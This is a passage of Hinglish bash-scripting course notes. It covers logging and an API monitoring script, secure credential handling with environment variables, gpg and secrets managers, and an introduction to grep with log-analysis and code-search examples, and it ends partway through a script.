readonly SCRIPT_NAME="api_monitor"
readonly LOG_DIR="/var/log/${SCRIPT_NAME}"
readonly LOG_FILE="${LOG_DIR}/monitor.log"
readonly ERROR_LOG="${LOG_DIR}/error.log"
readonly ALERT_LOG="${LOG_DIR}/alerts.log"
readonly METRICS_LOG="${LOG_DIR}/metrics.log"

# Initialize
mkdir -p "$LOG_DIR"

# Logging functions
log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
    
    if [ "$level" = "ERROR" ] || [ "$level" = "FATAL" ]; then
        echo "[$timestamp] $message" >> "$ERROR_LOG"
    fi
}

log_metric() {
    local metric=$1
    local value=$2
    local timestamp=$(date +%s)
    
    echo "$timestamp,$metric,$value" >> "$METRICS_LOG"
}

send_alert() {
    local message=$1
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] ALERT: $message" >> "$ALERT_LOG"
    
    # Send to monitoring system
    curl -X POST https://monitoring.example.com/alerts \
        -H "Content-Type: application/json" \
        -d "{\"message\":\"$message\",\"timestamp\":\"$timestamp\"}" \
        2>> "$ERROR_LOG" || log "ERROR" "Failed to send alert"
}

# Check API endpoint
check_endpoint() {
    local url=$1
    local name=$2
    
    log "INFO" "Checking endpoint: $name ($url)"
    
    local start_time=$(date +%s%3N)
    local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        --max-time 10 "$url" 2>> "$ERROR_LOG")
    local end_time=$(date +%s%3N)
    local response_time=$((end_time - start_time))
    
    # Log metrics
    log_metric "${name}_response_time" "$response_time"
    log_metric "${name}_http_code" "$http_code"
    
    # Check status
    if [ "$http_code" = "200" ]; then
        log "INFO" "✓ $name: OK (${response_time}ms)"
        
        if [ $response_time -gt 1000 ]; then
            log "WARN" "$name response time high: ${response_time}ms"
        fi
    else
        log "ERROR" "✗ $name: Failed (HTTP $http_code)"
        send_alert "$name endpoint returned HTTP $http_code"
        return 1
    fi
}

# Main monitoring loop
main() {
    log "INFO" "=== API Monitoring Started ==="
    
    local endpoints=(
        "https://api.example.com/health|Health Check"
        "https://api.example.com/users|Users API"
        "https://api.example.com/orders|Orders API"
    )
    
    local failed=0
    
    for endpoint in "${endpoints[@]}"; do
        IFS='|' read -r url name <<< "$endpoint"
        
        if ! check_endpoint "$url" "$name"; then
            ((failed++))
        fi
        
        sleep 1
    done
    
    if [ $failed -gt 0 ]; then
        log "ERROR" "$failed endpoint(s) failed"
        exit 1
    fi
    
    log "INFO" "=== All endpoints healthy ==="
}

# Error handler
trap 'log "ERROR" "Script failed at line $LINENO"' ERR

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `>&2` for stderr
- ✅ Timestamps in logs
- ✅ Log levels (INFO, ERROR, etc.)
- ✅ Separate error logs
- ✅ Log rotation

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: stdout aur stderr mein kya fark hai?**
A: stdout (1) normal output, stderr (2) errors. Alag redirect kar sakte hain.

**Q2: Log files kitni badi honi chahiye?**
A: 10-50MB max, phir rotate karo.

**Q3: Structured logging kyun use karu?**
A: JSON format parsing aur analysis easy karta hai.

### 14. **Practice ke liye Task**

```bash
# 1. Basic stderr
echo "Error message" >&2

# 2. Log function
log() {
    echo "[$(date)] $1" >> /tmp/test.log
}
log "Test message"

# 3. Error logging
error() {
    echo "[ERROR] $1" >&2
    echo "[$(date)] ERROR: $1" >> /tmp/error.log
}
error "Something failed"

# 4. Separate streams
./script.sh > output.log 2> error.log

# 5. Both to file
./script.sh > all.log 2>&1
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📝 `>&2` redirects to stderr
- ⏰ Always add timestamps
- 📊 Use log levels (INFO, ERROR)
- 🔄 Implement log rotation
- 🎯 Separate error logs

> **💡 Ye Zaroor Yaad Rakhein:**
> Errors hamesha stderr (`>&2`) par bhejo! Timestamps zaroori hain. Log levels use karo. Production mein log rotation implement karo. Structured logging (JSON) best hai!

---

## **Topic 6: Secure Credential Handling (Env Vars, `read -s`, `gpg`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Secure Credential Handling** - Passwords aur secrets ko safely handle karna.

### 2. **Ye Kya Hai? (What is it?)**
Secure credential handling passwords, API keys, aur sensitive data ko safely store aur use karna hai. Environment variables, `read -s` (silent input), aur `gpg` (encryption) use karke credentials ko protect karte hain. Kabhi bhi credentials ko plain text mein script mein hardcode nahi karte.

**Analogy:** Credentials ek safe ka combination hai - kabhi paper par nahi likhte, hamesha secure jagah par rakhte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security** - Credentials leak nahi hote
- ✅ **Compliance** - Security standards
- ✅ **Audit** - Who accessed what
- ✅ **Separation** - Code aur secrets alag

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Database passwords
- API keys
- SSH keys
- Any sensitive data

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Credential leaks
- Security breaches
- Data theft
- Compliance violations

### 6. **Syntax aur Common Options**

```bash
# Environment variables
export DB_PASSWORD="secret"
echo $DB_PASSWORD

# Read password silently
read -s -p "Enter password: " password
echo

# GPG encryption
echo "secret" | gpg -e -r user@example.com > secret.gpg
gpg -d secret.gpg

# .env file
source .env
echo $API_KEY

# Secure file permissions
chmod 600 credentials.txt
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

# Method 1: Environment variables
DB_USER="${DB_USER:-}"
DB_PASS="${DB_PASS:-}"

if [ -z "$DB_USER" ] || [ -z "$DB_PASS" ]; then
    echo "Error: DB credentials not set"
    exit 1
fi

# Method 2: Read from user (silent)
read -s -p "Enter database password: " db_password
echo

# Method 3: Read from file (secure permissions)
if [ -f ~/.db_credentials ]; then
    chmod 600 ~/.db_credentials
    source ~/.db_credentials
fi

# Method 4: Use credentials
mysql -u "$DB_USER" -p"$DB_PASS" mydb

# WRONG - Never do this!
# DB_PASS="hardcoded_password"  # ❌ BAD!
# mysql -u root -p"password123"  # ❌ BAD!
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Production-grade credential management

set -euo pipefail

readonly SCRIPT_NAME=$(basename "$0")
readonly CREDENTIALS_DIR="$HOME/.credentials"
readonly ENCRYPTED_FILE="${CREDENTIALS_DIR}/${SCRIPT_NAME}.gpg"
readonly ENV_FILE="${CREDENTIALS_DIR}/${SCRIPT_NAME}.env"

# Secure logging (mask sensitive data)
log() {
    local message=$1
    # Mask any potential passwords in logs
    message=$(echo "$message" | sed -E 's/(password|token|key)=[^ ]*/\1=***MASKED***/gi')
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message"
}

# Load credentials from environment
load_from_env() {
    log "Loading credentials from environment variables"
    
    DB_HOST="${DB_HOST:-}"
    DB_USER="${DB_USER:-}"
    DB_PASS="${DB_PASS:-}"
    API_KEY="${API_KEY:-}"
    
    if [ -z "$DB_HOST" ] || [ -z "$DB_USER" ] || [ -z "$DB_PASS" ]; then
        return 1
    fi
    
    log "✓ Credentials loaded from environment"
    return 0
}

# Load credentials from encrypted file
load_from_encrypted_file() {
    log "Loading credentials from encrypted file"
    
    if [ ! -f "$ENCRYPTED_FILE" ]; then
        log "Encrypted file not found: $ENCRYPTED_FILE"
        return 1
    fi
    
    # Decrypt and source
    if command -v gpg >/dev/null 2>&1; then
        local decrypted=$(gpg -d "$ENCRYPTED_FILE" 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            eval "$decrypted"
            log "✓ Credentials decrypted successfully"
            return 0
        else
            log "Failed to decrypt credentials"
            return 1
        fi
    else
        log "GPG not available"
        return 1
    fi
}

# Load credentials from .env file (with secure permissions)
load_from_env_file() {
    log "Loading credentials from .env file"
    
    if [ ! -f "$ENV_FILE" ]; then
        log ".env file not found: $ENV_FILE"
        return 1
    fi
    
    # Check permissions
    local perms=$(stat -c %a "$ENV_FILE" 2>/dev/null || stat -f %A "$ENV_FILE")
    if [ "$perms" != "600" ]; then
        log "WARNING: Insecure permissions on $ENV_FILE (should be 600)"
        chmod 600 "$ENV_FILE"
    fi
    
    source "$ENV_FILE"
    log "✓ Credentials loaded from .env file"
    return 0
}

# Prompt user for credentials
prompt_for_credentials() {
    log "Prompting user for credentials"
    
    read -p "Database host: " DB_HOST
    read -p "Database user: " DB_USER
    read -s -p "Database password: " DB_PASS
    echo
    read -s -p "API key: " API_KEY
    echo
    
    # Optionally save encrypted
    read -p "Save credentials encrypted? (y/n): " save_choice
    if [ "$save_choice" = "y" ]; then
        save_credentials_encrypted
    fi
}

# Save credentials encrypted
save_credentials_encrypted() {
    mkdir -p "$CREDENTIALS_DIR"
    chmod 700 "$CREDENTIALS_DIR"
    
    local creds="export DB_HOST='$DB_HOST'\n"
    creds+="export DB_USER='$DB_USER'\n"
    creds+="export DB_PASS='$DB_PASS'\n"
    creds+="export API_KEY='$API_KEY'\n"
    
    echo -e "$creds" | gpg -e -r "$USER" > "$ENCRYPTED_FILE"
    chmod 600 "$ENCRYPTED_FILE"
    
    log "✓ Credentials saved encrypted"
}

# Validate credentials
validate_credentials() {
    log "Validating credentials"
    
    if [ -z "${DB_HOST:-}" ] || [ -z "${DB_USER:-}" ] || [ -z "${DB_PASS:-}" ]; then
        log "ERROR: Missing required credentials"
        return 1
    fi
    
    # Test database connection
    if command -v mysql >/dev/null 2>&1; then
        if mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -e "SELECT 1" >/dev/null 2>&1; then
            log "✓ Database credentials valid"
            return 0
        else
            log "ERROR: Database credentials invalid"
            return 1
        fi
    fi
    
    return 0
}

# Clear credentials from memory
clear_credentials() {
    unset DB_HOST
    unset DB_USER
    unset DB_PASS
    unset API_KEY
    
    log "Credentials cleared from memory"
}

trap clear_credentials EXIT

# Main credential loading logic
load_credentials() {
    log "=== Loading Credentials ==="
    
    # Try multiple methods in order
    if load_from_env; then
        return 0
    elif load_from_encrypted_file; then
        return 0
    elif load_from_env_file; then
        return 0
    else
        log "No credentials found, prompting user"
        prompt_for_credentials
    fi
    
    # Validate
    if ! validate_credentials; then
        log "ERROR: Credential validation failed"
        exit 1
    fi
}

# Use credentials safely
use_credentials() {
    log "Connecting to database..."
    
    # Use credentials without exposing in process list
    mysql --defaults-extra-file=<(
        echo "[client]"
        echo "host=$DB_HOST"
        echo "user=$DB_USER"
        echo "password=$DB_PASS"
    ) -e "SELECT 'Connected successfully'"
    
    log "✓ Database operation completed"
}

# Main execution
main() {
    load_credentials
    use_credentials
    
    log "=== Script completed ==="
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Hardcoded passwords:** Script mein password likhna
- ❌ **Git mein commit:** Credentials version control mein
- ❌ **Insecure permissions:** 644 instead of 600
- ❌ **Logs mein passwords:** Error messages mein credentials

### 10. **Best Practices / Pro Tips**
- 💡 **Environment variables:** Production mein best
- 💡 **`.gitignore`:** Credential files add karo
- 💡 **Permissions:** 600 for files, 700 for directories
- 💡 **Mask in logs:** Passwords kabhi log mat karo
- 💡 **Vault services:** HashiCorp Vault, AWS Secrets Manager

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production deployment script with secure credential handling

set -euo pipefail

readonly APP_NAME="myapp"
readonly SECRETS_DIR="/etc/${APP_NAME}/secrets"
readonly LOG_FILE="/var/log/${APP_NAME}/deploy.log"

# Secure logging - mask sensitive data
log() {
    local message=$1
    # Remove any potential secrets from logs
    message=$(echo "$message" | sed -E 's/(password|token|key|secret)=[^ ]*/\1=***REDACTED***/gi')
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" | tee -a "$LOG_FILE"
}

# Load secrets from AWS Secrets Manager
load_from_aws_secrets() {
    log "Loading secrets from AWS Secrets Manager"
    
    if ! command -v aws >/dev/null 2>&1; then
        log "AWS CLI not available"
        return 1
    fi
    
    local secret_name="${APP_NAME}/production"
    local secret_json=$(aws secretsmanager get-secret-value \
        --secret-id "$secret_name" \
        --query SecretString \
        --output text 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        # Parse JSON and export variables
        export DB_HOST=$(echo "$secret_json" | jq -r '.db_host')
        export DB_USER=$(echo "$secret_json" | jq -r '.db_user')
        export DB_PASS=$(echo "$secret_json" | jq -r '.db_password')
        export API_KEY=$(echo "$secret_json" | jq -r '.api_key')
        
        log "✓ Secrets loaded from AWS Secrets Manager"
        return 0
    else
        log "Failed to load secrets from AWS"
        return 1
    fi
}

# Load secrets from local encrypted file (fallback)
load_from_local_encrypted() {
    log "Loading secrets from local encrypted file"
    
    local encrypted_file="${SECRETS_DIR}/credentials.gpg"
    
    if [ ! -f "$encrypted_file" ]; then
        log "Encrypted file not found"
        return 1
    fi
    
    # Check permissions
    local perms=$(stat -c %a "$encrypted_file" 2>/dev/null || stat -f %A "$encrypted_file")
    if [ "$perms" != "600" ]; then
        log "ERROR: Insecure permissions on encrypted file"
        return 1
    fi
    
    # Decrypt
    local decrypted=$(gpg --batch --quiet -d "$encrypted_file" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        eval "$decrypted"
        log "✓ Secrets decrypted from local file"
        return 0
    else
        log "Failed to decrypt local file"
        return 1
    fi
}

# Create database config file with credentials
create_db_config() {
    local config_file="/tmp/.my.cnf.$$"
    
    cat > "$config_file" <<EOF
[client]
host=$DB_HOST
user=$DB_USER
password=$DB_PASS
EOF
    
    chmod 600 "$config_file"
    echo "$config_file"
}

# Clean up credentials
cleanup() {
    log "Cleaning up credentials"
    
    # Remove temp files
    rm -f /tmp/.my.cnf.$$
    
    # Clear environment variables
    unset DB_HOST DB_USER DB_PASS API_KEY
    
    log "✓ Credentials cleared"
}

trap cleanup EXIT

# Main deployment
main() {
    log "=== Starting Deployment ==="
    
    # Load secrets
    if ! load_from_aws_secrets; then
        log "Falling back to local encrypted file"
        if ! load_from_local_encrypted; then
            log "ERROR: Failed to load secrets"
            exit 1
        fi
    fi
    
    # Validate secrets
    if [ -z "${DB_HOST:-}" ] || [ -z "${DB_PASS:-}" ]; then
        log "ERROR: Required secrets missing"
        exit 1
    fi
    
    # Use credentials safely
    local db_config=$(create_db_config)
    
    log "Running database migrations..."
    mysql --defaults-extra-file="$db_config" < migrations/schema.sql
    
    log "Deploying application..."
    # Use API_KEY without exposing it
    curl -H "Authorization: Bearer $API_KEY" \
        https://api.example.com/deploy \
        -d '{"app":"'$APP_NAME'"}' \
        2>&1 | grep -v "Authorization" >> "$LOG_FILE"
    
    log "=== Deployment Completed ==="
}

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Never hardcode credentials
- ✅ Use environment variables
- ✅ `read -s` for user input
- ✅ GPG for encryption
- ✅ Permissions: 600 for files

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Credentials kahan store karu?**
A: Environment variables (production), encrypted files (local), or vault services.

**Q2: `.env` file secure hai?**
A: Haan, agar permissions 600 hain aur `.gitignore` mein hai.

**Q3: Logs mein password aa gaya toh?**
A: Sed/regex se mask karo: `sed 's/password=[^ ]*/password=***/g'`

### 14. **Practice ke liye Task**

```bash
# 1. Environment variable
export DB_PASS="secret123"
echo $DB_PASS

# 2. Silent read
read -s -p "Password: " pass
echo
echo "You entered: $pass"

# 3. Encrypt with GPG
echo "my_secret" | gpg -e -r your@email.com > secret.gpg
gpg -d secret.gpg

# 4. Secure .env file
cat > .env <<EOF
DB_USER=admin
DB_PASS=secret
EOF
chmod 600 .env
source .env

# 5. Mask in logs
echo "password=secret123" | sed 's/password=[^ ]*/password=***/g'
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔐 Never hardcode credentials
- 🌍 Environment variables best
- 🤫 `read -s` for silent input
- 🔒 GPG for encryption
- 📝 Mask credentials in logs

> **💡 Ye Zaroor Yaad Rakhein:**
> Credentials kabhi hardcode mat karo! Environment variables ya encrypted files use karo. Permissions 600 rakho. Logs mein passwords mask karo. Production mein vault services use karo!

---

# **🎉 Module 12 Complete! 🎉**

Congratulations! Aapne **Module 12: Robust Scripting & Error Handling** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Exit Status** - `$?` aur error detection
✅ **Script Exit Codes** - `exit 0`, `exit 1`
✅ **Debugging** - `set -x`, `set -e`, `set -u`, `set -o pipefail`
✅ **trap Command** - Cleanup on exit
✅ **Error Logging** - stderr, log files
✅ **Secure Credentials** - Environment vars, GPG

## **Key Concepts:**

```bash
#!/bin/bash
# Robust script template

set -euo pipefail

readonly LOG_FILE="/var/log/script.log"

log() {
    echo "[$(date)] $1" | tee -a "$LOG_FILE"
}

error() {
    echo "[ERROR] $1" >&2
    log "ERROR: $1"
}

cleanup() {
    log "Cleanup started"
    rm -f /tmp/temp_$$_*
}

trap cleanup EXIT
trap 'error "Failed at line $LINENO"' ERR

# Load credentials securely
DB_PASS="${DB_PASS:-}"
[ -z "$DB_PASS" ] && read -s -p "Password: " DB_PASS

# Main logic
main() {
    log "Script started"
    
    # Your code here
    
    log "Script completed"
    exit 0
}

main "$@"
```

## **Best Practices Summary:**
- ✅ `set -euo pipefail` har script mein
- ✅ `trap cleanup EXIT` for cleanup
- ✅ Exit codes meaningful rakho
- ✅ Errors stderr par bhejo (`>&2`)
- ✅ Timestamps in logs
- ✅ Credentials secure rakho
- ✅ `$?` immediately check karo

## **Production Script Checklist:**
- [ ] Shebang: `#!/bin/bash`
- [ ] Strict mode: `set -euo pipefail`
- [ ] Trap for cleanup
- [ ] Error handling
- [ ] Logging (stdout + file)
- [ ] Exit codes
- [ ] Secure credentials
- [ ] Comments & documentation

## **Common Patterns:**

```bash
# Error handling
command || { error "Command failed"; exit 1; }

# Logging
log "INFO" "Message"
error "ERROR" "Problem"

# Cleanup
trap 'rm -f /tmp/temp_*' EXIT

# Credentials
read -s -p "Password: " pass
export DB_PASS="$pass"

# Debug mode
[ "${DEBUG:-false}" = "true" ] && set -x
```

## **Next Steps:**
Aap ab ready hain **Module 13: Powerful Text Processing** ke liye! Aage seekhenge `grep`, `sed`, `awk`, aur advanced text manipulation!

---

**💡 Remember:** Robust scripts production-ready hoti hain! Error handling, logging, aur security ko kabhi ignore mat karo. Yeh practices aapko professional developer banati hain! 🚀

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 13)**

---

## **PART 4: ADVANCED TOOLS & REAL-WORLD AUTOMATION**

---

# **Module 13: Powerful Text Processing**

---

## **Topic 1: `grep` (Basic, `-i`, `-v`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**grep** - Text patterns search karne ka powerful tool.

### 2. **Ye Kya Hai? (What is it?)**
`grep` (Global Regular Expression Print) ek command hai jo files ya input mein patterns search karta hai aur matching lines print karta hai. `-i` case-insensitive search, `-v` inverse match (non-matching lines).

**Analogy:** grep ek detective hai jo specific clues (patterns) dhoondhta hai crime scene (files) mein.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Fast searching** - Large files mein quickly search
- ✅ **Pattern matching** - Flexible search patterns
- ✅ **Log analysis** - Error messages find karna
- ✅ **Data filtering** - Relevant data extract karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Log files search karna
- Configuration files mein settings dhoondhna
- Code mein functions/variables search
- Data filtering aur extraction

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual searching (time waste)
- Missed important information
- Inefficient debugging
- Poor log analysis

### 6. **Syntax aur Common Options**

```bash
# Basic syntax
grep "pattern" file.txt

# Common options
grep -i "pattern" file.txt    # Case-insensitive
grep -v "pattern" file.txt    # Inverse (exclude)
grep -n "pattern" file.txt    # Line numbers
grep -c "pattern" file.txt    # Count matches
grep -l "pattern" *.txt       # Files with matches
grep -w "word" file.txt       # Whole word match
```

### 7. **Example 1 (Basic)**

```bash
# Basic search
grep "error" app.log
# Output: Lines containing "error"

# Case-insensitive
grep -i "error" app.log
# Matches: error, Error, ERROR

# Inverse match (exclude)
grep -v "debug" app.log
# Output: All lines except those with "debug"

# With line numbers
grep -n "TODO" script.sh
# Output: 15:# TODO: Fix this bug

# Count matches
grep -c "success" results.txt
# Output: 42

# Multiple files
grep "function" *.sh
# Output: file1.sh:function test()
#         file2.sh:function main()
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Log analysis script using grep

set -euo pipefail

readonly LOG_FILE="/var/log/app.log"
readonly REPORT_FILE="/tmp/log_report.txt"

analyze_logs() {
    echo "=== Log Analysis Report ===" > "$REPORT_FILE"
    echo "Generated: $(date)" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
    
    # Count errors
    local error_count=$(grep -c -i "error" "$LOG_FILE" || echo "0")
    echo "Total Errors: $error_count" >> "$REPORT_FILE"
    
    # Count warnings
    local warn_count=$(grep -c -i "warn" "$LOG_FILE" || echo "0")
    echo "Total Warnings: $warn_count" >> "$REPORT_FILE"
    
    # Find critical errors
    echo "" >> "$REPORT_FILE"
    echo "=== Critical Errors ===" >> "$REPORT_FILE"
    grep -i "critical\|fatal" "$LOG_FILE" >> "$REPORT_FILE" || echo "None found" >> "$REPORT_FILE"
    
    # Exclude debug messages
    echo "" >> "$REPORT_FILE"
    echo "=== Important Messages (excluding debug) ===" >> "$REPORT_FILE"
    grep -v -i "debug" "$LOG_FILE" | grep -i "error\|warn" | head -20 >> "$REPORT_FILE"
    
    # Find specific user activity
    echo "" >> "$REPORT_FILE"
    echo "=== Admin Activity ===" >> "$REPORT_FILE"
    grep -i "user=admin" "$LOG_FILE" >> "$REPORT_FILE" || echo "None found" >> "$REPORT_FILE"
    
    cat "$REPORT_FILE"
}

# Search for patterns in multiple files
search_in_codebase() {
    local pattern=$1
    
    echo "Searching for: $pattern"
    echo ""
    
    # Find in all .sh files
    grep -n "$pattern" *.sh 2>/dev/null || echo "No matches in .sh files"
    
    # Case-insensitive search in logs
    grep -i -n "$pattern" /var/log/*.log 2>/dev/null || echo "No matches in logs"
}

# Filter and extract data
extract_ips() {
    local log=$1
    
    echo "Extracting IP addresses from $log..."
    
    # Find lines with "failed login"
    grep -i "failed login" "$log" | \
        grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | \
        sort | uniq -c | sort -rn
}

# Main
main() {
    if [ $# -eq 0 ]; then
        analyze_logs
    else
        search_in_codebase "$1"
    fi
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** Spaces wale patterns ke liye quotes zaroori
- ❌ **Case sensitivity:** `-i` use karo agar case matter nahi karta
- ❌ **Exit code ignore:** grep kuch nahi milta toh exit code 1 hota hai

### 10. **Best Practices / Pro Tips**
- 💡 **`-i` use karo:** Case-insensitive search safe hai
- 💡 **`-v` for exclusion:** Unwanted lines filter karo
- 💡 **Combine with pipes:** `grep | grep` for multiple filters
- 💡 **`-w` for exact words:** Partial matches avoid karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production log monitoring script

readonly LOG_FILE="/var/log/nginx/access.log"
readonly ERROR_LOG="/var/log/nginx/error.log"
readonly ALERT_EMAIL="admin@example.com"

monitor_logs() {
    echo "=== Monitoring Logs ==="
    
    # Check for 5xx errors
    local server_errors=$(grep -c " 5[0-9][0-9] " "$LOG_FILE" || echo "0")
    
    if [ $server_errors -gt 10 ]; then
        echo "⚠️  High server errors: $server_errors"
        
        # Get details
        grep " 5[0-9][0-9] " "$LOG_FILE" | tail -20 | \
            mail -s "Server Error Alert" "$ALERT_EMAIL"
    fi
    
    # Check for failed authentication
    local auth_failures=$(grep -c "401" "$LOG_FILE" || echo "0")
    
    if [ $auth_failures -gt 50 ]; then
        echo "⚠️  High authentication failures: $auth_failures"
        
        # Extract IPs
        grep "401" "$LOG_FILE" | \
            grep -o '^[0-9.]*' | \
            sort | uniq -c | sort -rn | head -10
    fi
    
    # Check error log for critical issues
    if grep -q -i "critical\|emergency" "$ERROR_LOG"; then
        echo "🚨 Critical errors found!"
        grep -i "critical\|emergency" "$ERROR_LOG" | tail -10
    fi
    
    # Exclude health checks and find real errors
    grep -v "health-check" "$ERROR_LOG" | \
        grep -i "error" | \
        tail -20
}

monitor_logs
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `grep "pattern" file` basic search
- ✅ `-i` case-insensitive
- ✅ `-v` inverse/exclude
- ✅ `-n` line numbers
- ✅ `-c` count matches

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: grep kuch nahi milta toh kya hota hai?**
A: Exit code 1 return karta hai, output empty.

**Q2: Multiple patterns kaise search karu?**
A: `grep -e "pattern1" -e "pattern2"` ya `grep "pattern1\|pattern2"`

**Q3: Case-insensitive search kaise?**
A: `-i` option use karo: `grep -i "error"`

### 14. **Practice ke liye Task**

```bash
# 1. Basic search
grep "error" /var/log/syslog

# 2. Case-insensitive
grep -i "warning" app.log

# 3. Exclude pattern
grep -v "debug" app.log

# 4. Count matches
grep -c "success" results.txt

# 5. With line numbers
grep -n "TODO" script.sh

# 6. Multiple files
grep "function" *.sh

# 7. Whole word
grep -w "test" file.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔍 grep searches patterns in files
- 🔤 `-i` for case-insensitive
- 🚫 `-v` to exclude patterns
- 📊 `-c` to count matches
- 🎯 Essential for log analysis

> **💡 Ye Zaroor Yaad Rakhein:**
> grep text processing ka foundation hai! `-i` case-insensitive ke liye, `-v` exclude ke liye. Logs analyze karne mein sabse zyada use hota hai. Pipes ke saath combine karo!

---

## **Topic 2: `grep` Advanced (`-E`, `-r`, `-A`, `-B`, `--include`, `--exclude`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**grep Advanced** - Extended regex, recursive search, aur context options.

### 2. **Ye Kya Hai? (What is it?)**
Advanced grep options powerful searching enable karte hain: `-E` extended regex, `-r` recursive directory search, `-A`/`-B` context lines (after/before), `--include`/`--exclude` file filtering. Yeh complex search scenarios handle karte hain.

**Analogy:** Basic grep ek magnifying glass hai, advanced grep ek satellite imaging system hai - bahut zyada powerful aur precise.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Complex patterns** - Extended regex support
- ✅ **Directory search** - Recursive searching
- ✅ **Context** - Surrounding lines dekho
- ✅ **File filtering** - Specific files target karo

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Codebase mein search karna
- Complex patterns match karna
- Context ke saath results chahiye
- Specific file types search karna

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Limited search capabilities
- Manual directory traversal
- Missing context
- Inefficient searches

### 6. **Syntax aur Common Options**

```bash
# Extended regex
grep -E "pattern1|pattern2" file.txt

# Recursive search
grep -r "pattern" /path/to/dir

# Context lines
grep -A 3 "pattern" file.txt    # 3 lines after
grep -B 3 "pattern" file.txt    # 3 lines before
grep -C 3 "pattern" file.txt    # 3 lines before & after

# File filtering
grep -r --include="*.sh" "pattern" .
grep -r --exclude="*.log" "pattern" .
grep -r --exclude-dir="node_modules" "pattern" .
```

### 7. **Example 1 (Basic)**

```bash
# Extended regex (OR)
grep -E "error|warning|critical" app.log
# Matches any of the three

# Recursive search
grep -r "TODO" /home/user/projects/
# Searches all files in directory tree

# Context - 2 lines after match
grep -A 2 "Exception" error.log
# Shows exception + next 2 lines

# Context - 2 lines before match
grep -B 2 "Stack trace" error.log
# Shows 2 lines before + match

# Context - both sides
grep -C 3 "FATAL" app.log
# Shows 3 lines before + match + 3 lines after

# Include only .sh files
grep -r --include="*.sh" "function" .

# Exclude .log files
grep -r --exclude="*.log" "password" .

# Exclude directories
grep -r --exclude-dir="node_modules" "import" .
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced code search tool

set -euo pipefail

readonly PROJECT_DIR="${1:-.}"
readonly SEARCH_PATTERN="${2:-}"

# Color output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly NC='\033[0m' # No Color

usage() {
    cat <<EOF
Usage: $0 [directory] [pattern]

Advanced code search tool using grep.

Examples:
  $0 . "function.*main"
  $0 /var/log "error|warning"
EOF
    exit 1
}

# Search for security issues
search_security_issues() {
    echo -e "${RED}=== Security Issues ===${NC}"
    
    # Search for hardcoded passwords
    grep -rn -E --include="*.sh" --include="*.py" \
        "password\s*=\s*['\"][^'\"]+['\"]" "$PROJECT_DIR" \
        2>/dev/null || echo "None found"
    
    echo ""
    
    # Search for API keys
    grep -rn -E --include="*.sh" --include="*.py" \
        "api[_-]?key\s*=\s*['\"][^'\"]+['\"]" "$PROJECT_DIR" \
        2>/dev/null || echo "None found"
}

# Search for TODO/FIXME with context
search_todos() {
    echo -e "${YELLOW}=== TODOs and FIXMEs ===${NC}"
    
    grep -rn -C 2 -E --include="*.sh" --include="*.py" --include="*.js" \
        "TODO|FIXME|HACK|XXX" "$PROJECT_DIR" \
        --exclude-dir="node_modules" \
        --exclude-dir=".git" \
        2>/dev/null || echo "None found"
}

# Search for function definitions
search_functions() {
    local func_name=$1
    
    echo -e "${GREEN}=== Function: $func_name ===${NC}"
    
    # Shell functions
    grep -rn -A 5 -E --include="*.sh" \
        "^[[:space:]]*${func_name}[[:space:]]*\(\)" "$PROJECT_DIR" \
        2>/dev/null
    
    # Python functions
    grep -rn -A 5 -E --include="*.py" \
        "^[[:space:]]*def[[:space:]]+${func_name}" "$PROJECT_DIR" \
        2>/dev/null
}

# Search for error handling
search_error_handling() {
    echo -e "${RED}=== Error Handling Patterns ===${NC}"
    
    # Find try-catch blocks
    grep -rn -B 2 -A 5 -E --include="*.sh" --include="*.py" \
